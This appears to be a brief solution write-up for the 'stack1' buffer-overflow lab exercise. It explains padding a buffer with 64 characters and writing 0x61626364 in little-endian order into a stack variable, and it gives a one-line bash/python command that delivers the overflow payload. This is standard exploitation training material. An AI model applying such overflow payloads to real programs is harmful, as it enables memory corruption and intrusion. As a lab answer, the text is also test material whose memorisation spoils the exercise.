### Need to write the value 0x61626364 in the "modified" variable
### write it in little endian, so the hex number is inverse (0x64 0x63 0x62 0x61)
### You need to fill the buffer first with 64 characters to access the "modified" variable in the stack.

```bash
./stack1 `python -c 'print("C"*64 + "\x64\x63\x62\x61")'`
```
